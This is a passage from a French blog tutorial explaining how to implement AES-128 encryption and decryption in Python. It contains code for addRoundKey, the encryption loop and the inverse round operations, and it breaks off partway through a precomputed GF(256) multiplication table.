</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> new_state
</span></span></code></pre></div>
</div>








<style>
  .tabs input#tab-1-4:checked ~ .tab-content-1-4 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-4" />
<label for="tab-1-4" class="tab-label">addRoundKey</label>
<div class="tab-content tab-content-1-4">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/thomasperrot/aes-square-attack</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addroundkey</span>(state: array, key<span style="color:#f92672">=</span>[[], [], [], []]):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(key) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Wrong length: </span><span style="color:#e6db74">{</span>len(key)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    new_state <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(state, dtype<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            new_state[i][j] <span style="color:#f92672">^=</span> key[j][i]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> new_state
</span></span></code></pre></div>
</div>








<style>
  .tabs input#tab-1-5:checked ~ .tab-content-1-5 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-5" />
<label for="tab-1-5" class="tab-label">encrypt</label>
<div class="tab-content tab-content-1-5">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/thomasperrot/aes-square-attack</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ici round = nbre de tous AES-128 ==&gt; 10 rounds</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">transform_state</span>(plaintext: bytes, key: bytes, rounds: int):
</span></span><span style="display:flex;"><span>    key_state <span style="color:#f92672">=</span> key_expension(key, rounds<span style="color:#f92672">=</span>rounds <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    round_key <span style="color:#f92672">=</span> key_state[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> tostate (plaintext)
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> addroundkey(state, round_key)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, rounds):
</span></span><span style="display:flex;"><span>        round_key <span style="color:#f92672">=</span> key_state[<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> i : <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)]
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> subbytes(state)
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> shiftrows(state)
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> mixcolumns(state)
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> addroundkey(state, round_key)
</span></span><span style="display:flex;"><span>    round_key <span style="color:#f92672">=</span> key_state[<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> rounds : <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> (rounds <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)]
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> subbytes(state)
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> shiftrows(state)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#no mix colums for last round</span>
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> addroundkey(state, round_key)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> state
</span></span></code></pre></div>
</div>





</div>



<h2 id="3--aes---déchiffrement">3.  AES - Déchiffrement<a href="#3--aes---d%c3%a9chiffrement" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>Comme vous le savez c&rsquo;est l&rsquo;opération inverse du chiffrement qui avec la clé et le texte chiffré nous permettra de retrouver le message en clair.</p>
<h3 id="31-procédé-de-déchiffement">3.1 Procédé de déchiffement<a href="#31-proc%c3%a9d%c3%a9-de-d%c3%a9chiffement" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h3>
<p>Ayant la clé de chiffrement, la première étape serait l&rsquo;expansion de la clé. Ensuite il va falloir faire les opérations inverses, du SubBytes, ShiftRows, MixColumns. Le addRoundKey demeure inchangé.
Notons <strong>\(I\)SubBytes</strong> l&rsquo;inverse de l&rsquo;opération SubBytes (inverse de la Sbox), <strong>\(I\)ShiftRows</strong> l&rsquo;inverse de ShiftRows et <strong>\(I\)MixColumns</strong> l&rsquo;inverse du MixColumns.
Le texte à déchiffrer est découpé en blocs de 16 octets et en matrice 4x4 comme pour obtenir le state, ensuite pour chaque bloc chiffré, on effectue les opérations suivantes pour produire un bloc clair de même longueur</p>
<ul>
<li>On initialise un tableau \(4 \times 4\) avec \(16\) octets de texte chiffré</li>
<li>On applique successivement les opérations suivantes sur ce tableau:
1. AddRoundKey, \(I\)ShiftRows, et \(I\)SubBytes dans cet ordre.
2. On effectue &ldquo;nombre de tours total&rdquo;-1 tours comportant les 4 étapes  AddRoundKey, \(I\)MixColumns, \(I\)ShiftRows puis \(I\)SubBytes.
3. Un dernier tour ne comporte plus qu’une étapes : AddRoundKey
Et voilà, on obtient notre message en clair.
Attention, pour l&rsquo;étape AddRoundKey, on commence par la dernières sous-clés dérivés jusqu&rsquo;à atteindre la clé elle même pour le dernier tour.</li>
</ul>
<h5 id="isubbytes">\(I\)SubBytes<a href="#isubbytes" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>La fonction permettant d&rsquo;avoir la Sbox étant bijective, il faut calculer son inverse pour avoir la Sbox inverse.
On a donc deux possibilités: soit on précalcule la Sbox inverse ensuite on la lit comme la Sbox, soit on utilise la Sbox mais qu&rsquo;on lira dans l&rsquo;autre sens i.e. partir de l&rsquo;image \(y\) et retrouvé le \(x\) correspondant. Donc pour faire simple, supposons on cherche la Sbox inverse de \(5F\), on va chercher dans le tableau de la Sbox où est localisé \(5F\) et ensuite on lira le x correspondant.
et donc on trouve \(84\).


    <figure><img src="https://dilagluc.github.io/crypto_aes/Isubbytes.png"/></figure></p>
<h5 id="ishiftrows">\(I\)ShiftRows<a href="#ishiftrows" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>C&rsquo;est l&rsquo;exacte inverse du ShiftRows, décalage à droite de \(i\) colonnes de la ligne \(i\) , \(0\leq i \leq 3\)


    <figure><img src="https://dilagluc.github.io/crypto_aes/Ishiftrows.png"/></figure></p>
<h5 id="imixcolumns">\(I\)MixColumns<a href="#imixcolumns" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>L&rsquo;opération MixColumns étant défini par \(B=M\times A\), donc inverser MixColumns revient à trouver la matrice \(A\) et donc on a:<br>
</p>
$$ A = M^{-1} \times B$$
<p> Il suffit donc d&rsquo;inverser la matrice de l&rsquo;opération MixColumns \(M\) dans \(\mathbb{F}_{256}\). On trouve:</p>
$$M = \begin{bmatrix}
0E&0B&0D&09 \\\\
09&0E&0B&0D \\\\
0D&09&0E&0B \\\\
0B&0D&09&0E \\\\
\end{bmatrix} = 
\begin{bmatrix}
14&11&13&9 \\\\
9&14&11&13 \\\\
13&9&14&11 \\\\
11&13&9&14 \\\\
\end{bmatrix}
$$
<p>
On peut donc également pour cette étape précalculer les valeurs pour les multiplications par 14, 13, 11 et 9.</p>
<h4 id="32-implémentation">3.2 Implémentation<a href="#32-impl%c3%a9mentation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>Implémentation finale:
<a href="/crypto_aes/aes_decrypt.py">aes_decrypt.py</a></p>





<div class="tabs tabs-left">
  




<style>
  .tabs input#tab-2-0:checked ~ .tab-content-2-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-2" id="tab-2-0" checked/>
<label for="tab-2-0" class="tab-label">\(I\)SubBytes</label>
<div class="tab-content tab-content-2-0">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ISubBytes</span>(state: array, sbox_map<span style="color:#f92672">=</span>ke<span style="color:#f92672">.</span>get_sbox_map()):
</span></span><span style="display:flex;"><span>    new_state <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>zeros((<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>), dtype<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            pos <span style="color:#f92672">=</span> list(sbox_map<span style="color:#f92672">.</span>values())<span style="color:#f92672">.</span>index(state[i, j])
</span></span><span style="display:flex;"><span>            new_state[i, j] <span style="color:#f92672">=</span> pos
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> new_state
</span></span></code></pre></div>
</div>








<style>
  .tabs input#tab-2-1:checked ~ .tab-content-2-1 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-2" id="tab-2-1" />
<label for="tab-2-1" class="tab-label">\(I\)ShiftRows</label>
<div class="tab-content tab-content-2-1">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">IShiftRows</span>(state: array):
</span></span><span style="display:flex;"><span>    new_state <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(state, dtype<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>        new_state[i] <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>roll(new_state[i], i)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> new_state
</span></span></code></pre></div>
</div>








<style>
  .tabs input#tab-2-2:checked ~ .tab-content-2-2 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-2" id="tab-2-2" />
<label for="tab-2-2" class="tab-label">\(I\)MixColumns</label>
<div class="tab-content tab-content-2-2">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>MULTIPLICATION_BY_9 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x1b</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0xb4</span>, <span style="color:#ae81ff">0xbd</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0xaf</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0xca</span>, <span style="color:#ae81ff">0xc3</span>, <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0xf5</span>, <span style="color:#ae81ff">0xee</span>, <span style="color:#ae81ff">0xe7</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x1f</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0xd</span>, <span style="color:#ae81ff">0x4</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x7a</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0xab</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0xb9</span>, <span style="color:#ae81ff">0xb0</span>, <span style="color:#ae81ff">0x8f</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x9d</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0xea</span>, <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0xc7</span>, <span style="color:#ae81ff">0xce</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0xdc</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x7f</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0xe6</span>, <span style="color:#ae81ff">0xef</span>, <span style="color:#ae81ff">0xf4</span>, <span style="color:#ae81ff">0xfd</span>, <span style="color:#ae81ff">0xc2</span>, <span style="color:#ae81ff">0xcb</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0xd9</span>, <span style="color:#ae81ff">0xae</span>, <span style="color:#ae81ff">0xa7</span>, <span style="color:#ae81ff">0xbc</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0x8a</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x7b</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0xc</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x1e</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0xdd</span>, <span style="color:#ae81ff">0xd4</span>, <span style="color:#ae81ff">0xcf</span>, <span style="color:#ae81ff">0xc6</span>, <span style="color:#ae81ff">0xf9</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0x9c</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0xb1</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0xa3</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0xec</span>, <span style="color:#ae81ff">0xe5</span>, <span style="color:#ae81ff">0xfe</span>, <span style="color:#ae81ff">0xf7</span>, <span style="color:#ae81ff">0xc8</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0xd3</span>, <span style="color:#ae81ff">0xa4</span>, <span style="color:#ae81ff">0xad</span>, <span style="color:#ae81ff">0xb6</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x9b</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x2</span>, <span style="color:#ae81ff">0xb</span>, <span style="color:#ae81ff">0xd7</span>, <span style="color:#ae81ff">0xde</span>, <span style="color:#ae81ff">0xc5</span>, <span style="color:#ae81ff">0xcc</span>, <span style="color:#ae81ff">0xf3</span>, <span style="color:#ae81ff">0xfa</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0x9f</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x8d</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0xa9</span>, <span style="color:#ae81ff">0xa0</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x4e</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0xf</span>, <span style="color:#ae81ff">0x6</span>, <span style="color:#ae81ff">0x1d</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0xdb</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0xf6</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x4b</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x7d</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0xa8</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0x8c</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x9e</span>, <span style="color:#ae81ff">0xe9</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0xfb</span>, <span style="color:#ae81ff">0xf2</span>, <span style="color:#ae81ff">0xcd</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0xdf</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0xe</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x6b</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x46</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MULTIPLICATION_BY_11 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0xb</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x1d</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x4e</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x7f</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0xb0</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0xad</span>, <span style="color:#ae81ff">0x9c</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x8a</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0xfe</span>, <span style="color:#ae81ff">0xf5</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0xcf</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0xd9</span>, <span style="color:#ae81ff">0x7b</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0xf</span>, <span style="color:#ae81ff">0x4</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0xcb</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0xdd</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0xe7</span>, <span style="color:#ae81ff">0xec</span>, <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0xfa</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0xb4</span>, <span style="color:#ae81ff">0xa9</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0xf6</span>, <span style="color:#ae81ff">0xfd</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0xcc</span>, <span style="color:#ae81ff">0xc7</span>, <span style="color:#ae81ff">0xae</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x9f</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x1e</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x8d</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x9b</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0xbc</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0xde</span>, <span style="color:#ae81ff">0xc3</span>, <span style="color:#ae81ff">0xc8</span>, <span style="color:#ae81ff">0xf9</span>, <span style="color:#ae81ff">0xf2</span>, <span style="color:#ae81ff">0xef</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0xc</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x78</span>, <span 